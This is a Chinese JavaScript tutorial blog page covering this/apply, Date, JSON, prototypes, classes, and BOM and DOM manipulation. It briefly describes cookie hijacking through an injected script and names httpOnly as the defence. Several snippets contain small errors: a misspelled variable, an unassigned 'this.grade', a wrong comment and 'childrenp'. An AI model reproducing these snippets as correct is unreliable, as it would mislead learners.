<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAge</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> now = <span class="keyword">new</span> <span class="built_in">Date</span>().getFullYear();</span><br><span class="line">    <span class="keyword">return</span> now - <span class="built_in">this</span>.birth;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> john = &#123;</span><br><span class="line">    name: <span class="string">&#x27;yu&#x27;</span>,</span><br><span class="line">    birth: <span class="number">2020</span>,</span><br><span class="line">    age: getAge</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//john.age()    ok</span></span><br><span class="line"><span class="comment">//getAge()      NaN  window</span></span><br></pre></td></tr></table></figure>
<p>this 是无法指向的，是默认指向调用它的那个对象；</p>
<blockquote>
<p>apply</p>
</blockquote>
<p>在JS中，可以控制 this 指向！</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAge</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> now = <span class="keyword">new</span> <span class="built_in">Date</span>().getFullYear();</span><br><span class="line">    <span class="keyword">return</span> now - <span class="built_in">this</span>.birth;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> john = &#123;</span><br><span class="line">    name: <span class="string">&#x27;yu&#x27;</span>,</span><br><span class="line">    birth: <span class="number">2020</span>,</span><br><span class="line">    age: getAge</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> tom = &#123;</span><br><span class="line">    name: <span class="string">&#x27;tom&#x27;</span>,</span><br><span class="line">    birth: <span class="number">2000</span>,</span><br><span class="line">    age: getAge</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">getAge.apply(john,[]);      <span class="comment">//this，指向了john，参数为空</span></span><br><span class="line">getAge.apply(tom,[]);      <span class="comment">//this，指向了john，参数为空</span></span><br></pre></td></tr></table></figure>


<h2 id="5、内部对象"><a href="#5、内部对象" class="headerlink" title="5、内部对象"></a>5、内部对象</h2><blockquote>
<p>标准对象</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span>(<span class="number">123</span>)</span><br><span class="line"><span class="string">&quot;number&quot;</span></span><br><span class="line"><span class="keyword">typeof</span>(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"><span class="string">&quot;string&quot;</span></span><br><span class="line"><span class="keyword">typeof</span>(<span class="literal">NaN</span>)</span><br><span class="line"><span class="string">&quot;number&quot;</span></span><br><span class="line"><span class="keyword">typeof</span> []</span><br><span class="line"><span class="string">&quot;object&quot;</span></span><br><span class="line"><span class="keyword">typeof</span> &#123;&#125;</span><br><span class="line"><span class="string">&quot;object&quot;</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="built_in">Math</span>.abs</span><br><span class="line"><span class="string">&quot;function&quot;</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">undefined</span></span><br><span class="line"><span class="string">&quot;undefined&quot;</span></span><br></pre></td></tr></table></figure>


<h3 id="5-1-Date"><a href="#5-1-Date" class="headerlink" title="5.1 Date"></a>5.1 Date</h3><blockquote>
<p>基本使用</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> now = <span class="keyword">new</span> <span class="built_in">Date</span>();       <span class="comment">//VM61:1 Mon Feb 08 2021 09:30:45 GMT+0800 (中国标准时间)</span></span><br><span class="line">now.getFullYear();      <span class="comment">//年</span></span><br><span class="line">now.getMonth();     <span class="comment">//月  0~11 代表月</span></span><br><span class="line">now.getDate();      <span class="comment">//日</span></span><br><span class="line">now.getDay();       <span class="comment">//星期几</span></span><br><span class="line">now.getHours();     <span class="comment">//时</span></span><br><span class="line">now.getMinutes();   <span class="comment">//分</span></span><br><span class="line">now.getSeconds();   <span class="comment">//秒</span></span><br><span class="line"></span><br><span class="line">now.getTime();      <span class="comment">//时间戳，全世界统一 1970.1.1 0：00：00 毫秒数</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">1612748116493</span>));   <span class="comment">//时间戳转为本地时间</span></span><br></pre></td></tr></table></figure>
<p>转换</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> now = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">1612748116493</span>);</span><br><span class="line">Mon Feb <span class="number">08</span> <span class="number">2021</span> <span class="number">09</span>:<span class="number">35</span>:<span class="number">16</span> GMT+<span class="number">0800</span> (中国标准时间)</span><br><span class="line">now.toLocaleString()		<span class="comment">//注意，调用是一个方法，不是一个属性</span></span><br><span class="line"><span class="string">&quot;2021/2/8 上午9:35:16&quot;</span></span><br><span class="line">now.toGMTString()</span><br><span class="line"><span class="string">&quot;Mon, 08 Feb 2021 01:35:16 GMT&quot;</span></span><br></pre></td></tr></table></figure>


<h3 id="5-2-JSON"><a href="#5-2-JSON" class="headerlink" title="5.2 JSON"></a>5.2 JSON</h3><blockquote>
<p>JSON是什么</p>
</blockquote>
<p>早期，所有数据传输习惯使用 XML 文件</p>
<ul>
<li>JSON(JavaScript Object Notation, JS 对象标记) 是一种轻量级的数据交换格式。</li>
<li> 简洁和清晰的<strong>层次结构</strong>使得 JSON 成为理想的数据交换语言。 </li>
<li>易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率。</li>
</ul>
<p>在JS中一切皆为对象，任何JS支持的类型都可以用 JSON 来表示；number,string….</p>
<p>格式：</p>
<ul>
<li>对象都用 {}</li>
<li>数组都用 []</li>
<li>所有键值对都是用 key:value</li>
</ul>
<p>JSON 和 JS 对象的转化</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> user = &#123;</span><br><span class="line">    name: <span class="string">&quot;john&quot;</span>,</span><br><span class="line">    age: <span class="number">3</span>,</span><br><span class="line">    gender: <span class="string">&quot;male&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对象转化为JSON字符串</span></span><br><span class="line"><span class="keyword">var</span> jsonUser = <span class="built_in">JSON</span>.stringify(user);</span><br><span class="line"></span><br><span class="line"><span class="comment">//json 字符串转化为对象,参数为 json 字符串</span></span><br><span class="line"><span class="keyword">var</span> obj = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;name&quot;:&quot;john&quot;,&quot;age&quot;:3,&quot;gender&quot;:&quot;male&quot;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>很多人搞不清楚，JSON 和 JS 对象的区别</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">a</span>: <span class="string">&#x27;hello&#x27;</span> ,<span class="attr">b</span>: <span class="string">&#x27;hellob&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> json = <span class="string">&#x27;&#123;&quot;a&quot;:&quot;hello&quot;,&quot;b&quot;:&quot;hellob&quot;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>


<h3 id="5-3-Ajax"><a href="#5-3-Ajax" class="headerlink" title="5.3 Ajax"></a>5.3 Ajax</h3><ul>
<li>原生的 JS 写法  xhr 异步请求</li>
<li>JQuery 封装好的方法 <code>$(&quot;#name&quot;).ajax(&quot;&quot;)</code></li>
<li>axios 请求</li>
</ul>
<h2 id="6、面向对象编程"><a href="#6、面向对象编程" class="headerlink" title="6、面向对象编程"></a>6、面向对象编程</h2><blockquote>
<p>原型对象</p>
</blockquote>
<p>JavaScript、Java、c#……面向对象；JavaScript有些区别！</p>
<ul>
<li><p>类：模板，原型对象</p>
</li>
<li><p>对象：具体的实例</p>
</li>
</ul>
<p>在 JavaScript 中这个需要大家换一下思维方式！</p>
<p>原型：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Student = &#123;</span><br><span class="line">    name: <span class="string">&quot;john&quot;</span>,</span><br><span class="line">    age: <span class="number">3</span>,</span><br><span class="line">    run: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.name + <span class="string">&quot; run...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">    name: <span class="string">&quot;xiaoming&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//原型对象</span></span><br><span class="line">xiaoming.__proto__ = Student;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Bird = &#123;</span><br><span class="line">    fly: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.name + <span class="string">&quot; fly...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//小明的原型是 Student</span></span><br><span class="line">xiaoming.__proto__ = Bird;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Student</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//给Student新增一个方法</span></span><br><span class="line">Student.prototype.hello = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<blockquote>
<p>class继承</p>
</blockquote>
<p><code>class</code> 关键字，是在ES6引入的</p>
<ol>
<li>定义一个类，属性，方法</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义一个学生的类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">name</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        alert(<span class="string">&#x27;helllo&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xiaoming = <span class="keyword">new</span> Student(<span class="string">&#x27;xiaoming&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> xiaohong = <span class="keyword">new</span> Student(<span class="string">&#x27;xiaohong&#x27;</span>);</span><br><span class="line">xuaiming.hello()</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>继承</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">name</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        alert(<span class="string">&#x27;helllo&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pupple</span> <span class="keyword">extends</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">name,grade</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(name);</span><br><span class="line">        <span class="built_in">this</span>.grade;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">myGrade</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        alert(<span class="string">&quot;I am a pupple!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> xiaoming = <span class="keyword">new</span> Student(<span class="string">&#x27;xiaoming&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> xiaohong = <span class="keyword">new</span> Pupple(<span class="string">&#x27;xiaohong&#x27;</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>本质：查看对象原型</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210208113944286.png" alt="image-20210208113944286"></p>
<blockquote>
<p>原型链</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210208114517057.png" alt="image-20210208114517057"></p>
<h2 id="7、操作BOM对象（重点）"><a href="#7、操作BOM对象（重点）" class="headerlink" title="7、操作BOM对象（重点）"></a>7、操作BOM对象（重点）</h2><blockquote>
<p>浏览器介绍</p>
</blockquote>
<p>JavaScript和浏览器的关系？</p>
<p>JavaScript的诞生就是为了让他能够在浏览器中运行！</p>
<p>BOM：浏览器对象模型</p>
<ul>
<li><p>IE 6 ~ 11</p>
</li>
<li><p>Chrome</p>
</li>
<li><p>Safari</p>
</li>
<li><p>FireFox Linux</p>
</li>
</ul>
<p>三方</p>
<ul>
<li>QQ浏览器</li>
<li>360浏览器</li>
</ul>
<blockquote>
<p><strong>window</strong></p>
</blockquote>
<p>window 代表浏览器窗口</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.alert(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">window</span>.innerHeight</span><br><span class="line"><span class="number">137</span></span><br><span class="line"><span class="built_in">window</span>.innerWidth</span><br><span class="line"><span class="number">847</span></span><br><span class="line"><span class="built_in">window</span>.outerHeight</span><br><span class="line"><span class="number">681</span></span><br><span class="line"><span class="built_in">window</span>.outerHeight</span><br><span class="line"><span class="number">681</span></span><br><span class="line"><span class="comment">//大家可以调整浏览器窗口试试</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p>Navigator（不建议使用）</p>
</blockquote>
<p>Navigator 封装了浏览器的信息</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">navigator.appName</span><br><span class="line"><span class="string">&quot;Netscape&quot;</span></span><br><span class="line">navigator.appVersion</span><br><span class="line"><span class="string">&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;</span></span><br><span class="line">navigator.userAgent</span><br><span class="line"><span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;</span></span><br><span class="line">navigator.platform</span><br><span class="line"><span class="string">&quot;Win32&quot;</span></span><br></pre></td></tr></table></figure>
<p>大多数时候，我们不会使用 <code>navigator</code> 对象，因为回被认为修改</p>
<p>不建议使用这些属性来判断和编写代码</p>
<blockquote>
<p>screen</p>
</blockquote>
<p>代表屏幕尺寸</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">screen.width</span><br><span class="line"><span class="number">1536</span> px</span><br><span class="line">screen.height</span><br><span class="line"><span class="number">864</span> px</span><br></pre></td></tr></table></figure>


<blockquote>
<p><strong>location</strong></p>
</blockquote>
<p>location 代表当前页面的 URL 信息</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">host: <span class="string">&quot;www.baidu.com&quot;</span></span><br><span class="line">href: <span class="string">&quot;https://www.baidu.com/&quot;</span></span><br><span class="line">protocol: <span class="string">&quot;https:&quot;</span></span><br><span class="line">reload: ƒ reload()  <span class="comment">//刷新网页</span></span><br><span class="line"><span class="comment">//设置新的地址</span></span><br><span class="line">location.assign(<span class="string">&#x27;https://www.szu.edu.cn&#x27;</span>)</span><br></pre></td></tr></table></figure>


<blockquote>
<p>document（内容； DOM）</p>
</blockquote>
<p>document 代表当前的页面，HTML DOM文档树</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.title</span><br><span class="line"><span class="string">&quot;深圳大学&quot;</span></span><br><span class="line"><span class="built_in">document</span>.title = <span class="string">&#x27;信息中心&#x27;</span></span><br><span class="line"><span class="string">&quot;信息中心&quot;</span></span><br></pre></td></tr></table></figure>
<p>获取具体的文档树结点</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Java<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span>JavaSE<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span>JavaEE<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> dl = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;app&#x27;</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>获取cookie</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie</span><br></pre></td></tr></table></figure>
<p>劫持 cookie 原理</p>
<p><a class="link"   href="http://www.taobao.com/" >www.taobao.com<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;aa,js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--恶意人员：获取你的的 cookie 上传到他的服务器--&gt;</span></span><br></pre></td></tr></table></figure>
<p>服务器端可以设置 cookie: httpOnly</p>
<blockquote>
<p>history（不建议使用）</p>
</blockquote>
<p>history 代表浏览器的历史记录</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">history.back();		<span class="comment">//后退</span></span><br><span class="line">history.forward();		<span class="comment">//前进</span></span><br></pre></td></tr></table></figure>


<h2 id="8、操作DOM对象"><a href="#8、操作DOM对象" class="headerlink" title="8、操作DOM对象"></a>8、操作DOM对象</h2><blockquote>
<p>核心</p>
</blockquote>
<p>浏览器网页就是一个 DOM 树形结构！</p>
<ul>
<li>更新：更新 DOM 结点</li>
<li>遍历 DOM 结点：得到 DOM 结点</li>
<li>删除：删除一个 DOM 结点</li>
<li>添加：添加一个新的结点</li>
</ul>
<p>要操作一个 DOM 结点，就必须要先获得这个 DOM 结点</p>
<blockquote>
<p>获得 DOM 结点</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对应 css 选择器</span></span><br><span class="line"><span class="keyword">var</span> h1 = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;h1&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> p1 = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;p1&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="built_in">document</span>.getElementsByClassName(<span class="string">&#x27;p2&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> father =<span class="built_in">document</span>.getElementById(<span class="string">&#x27;father&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> childens = father.childrenp[index];     <span class="comment">//获取父节点下的所有子节点</span></span><br><span class="line"><span class="comment">//father.firstChild;</span></span><br><span class="line"><span class="comment">//father.lastChild;</span></span><br></pre></td></tr></table></figure>
<p>这是原生代码，之后我们尽量都是用JQuery</p>
<blockquote>
<p>更新节点</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;id1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> id1 = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;id1&#x27;</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>操作文本</p>
<ul>
<li><p><code>id1.innerText=&#39;456&#39;</code>  修改文本的值</p>
</li>
<li><p><code>id1.innerHTML=&#39;&lt;strong&gt;123&lt;/strong&gt;&#39;</code>  可以解析HTML文本标签</p>
</li>
</ul>
<p>操作JS</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">id1.style.color = <span class="string">&#x27;red&#x27;</span>		<span class="comment">//属性使用 字符串 包裹</span></span><br><span class="line">id1.style.fontSize = <span class="string">&#x27;20px&#x27;</span>;	<span class="comment">// _  转 驼峰命名问题</span></span><br><span class="line">id1.style.padding = <span class="string">&#x27;2em&#x27;</span>;</span><br></pre></td></tr></table></figure>


<blockquote>
<p>删除结点</p>
</blockquote>
<p>删除结点的步骤：先获取父节点，再通过父节点删除自己</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;father&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>标题1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;p1&quot;</span>&gt;</span>p1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;p2&quot;</span>&gt;</span>p2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> self = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;p1&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> father = p1.parentElement;</span></span><br><span class="line">	father.removeChild(p1);</span><br><span class="line">    </span><br><span class="line"><span class="javascript">    <span class="comment">//删除是一个动态的过程</span></span></span><br><span class="line">    father.removeChild(father.children[0]);</span><br><span class="line">    father.removeChild(father.children[0]);</span><br><span class="line">    father.removeChild(father.children[0]);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>注意：删除多个节点的时候，children 是在时刻变化的，删除节点的时候一定要注意！</p>
<blockquote>
<p>插入节点</p>
</blockquote>
<p>我们获得了某个 DOM 节点，假设这个 DOM 结点时空的，我们通过 innerHTML 就可以增加一个元素了，但是这个 DOM 节点已经存在元素了，我们就不能这么干了！会产生覆盖</p>
<p>追加</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;js&quot;</span>&gt;</span>javascript<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;se&quot;</span>&gt;</span>javase<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;ee&quot;</span>&gt;</span>javaee<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;me&quot;</span>&gt;</span>avame<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> js = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;js&#x27;</span>),		<span class="comment">//已存在的节点</span></span></span><br><span class="line"><span class="javascript">        list = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;list&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    list.appendChild(js);		<span class="comment">//追加到后面</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>效果</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210208210257255.png" alt="image-20210208210257255"></p>
<blockquote>
<p>创建一个新的标签，实现插入</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;js&quot;</span>&gt;</span>javascript<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;se&quot;</span>&gt;</span>javase<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;ee&quot;</span>&gt;</span>javaee<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;me&quot;</span>&gt;</span>avame<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> js = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;js&#x27;</span>),</span></span><br><span class="line"><span class="javascript">        list = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;list&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="comment">//通过JS创建一个新的节点</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> newP = <span class="built_in">document</span>.createElement(<span class="string">&#x27;p&#x27;</span>); <span class="comment">//创建一个p标签</span></span></span><br><span class="line"><span class="javascript">    newP.id = <span class="string">&#x27;newP&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    newP.innerText = <span class="string">&#x27;Hello&#x27;</span>;</span></span><br><span class="line">    list.appendChild(newP);</span><br><span class="line"><span class="javascript">    <span class="comment">//创建一个标签节点（通过这个属性，可以设置任意的值）</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> myScript = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    myScript.setAttribute(<span class="string">&#x27;type&#x27;</span>,<span class="string">&#x27;text/javascript&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="comment">//之际修改body标签的属性</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> body = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;body&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    body[<span class="number">0</span>].style.backgroundColor = <span class="string">&#x27;#a94751&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//可以创建一个style标签</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> myStyle = <span class="built_in">document</span>.createElement(<span class="string">&#x27;style&#x27;</span>);  <span class="comment">//创建了一个空style标签</span></span></span><br><span class="line"><span class="javascript">    myStyle.setAttribute(<span class="string">&#x27;type&#x27;</span>,<span class="string">&#x27;text/css&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    myStyle.innerHTML = <span class="string">&#x27;body&#123;background-color: blue&#125;&#x27;</span>;  <span class="comment">//设置标签的内容</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;head&#x27;</span>)[<span class="number">0</span>].appendChild(myStyle);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p>insert</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ee = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;ee&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> js = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;js&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> list = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;list&#x27;</span>);</span><br><span class="line"><span class="comment">//要包含的节点，insertBefore(newNode,targetNode)</span></span><br><span class="line">list.insertBefore(js,ee);</span><br></pre></td></tr></table></figure>


<h2 id="9、操作表单（验证）"><a href="#9、操作表单（验证）" class="headerlink" title="9、操作表单（验证）"></a>9、操作表单（验证）</h2><blockquote>
<p>表单是什么 form  DOM树</p>
</blockquote>
<ul>
<li>文本框  text</li>
<li>下拉框 <code> &lt;select&gt;</code></li>
<li>单选框   radio</li>
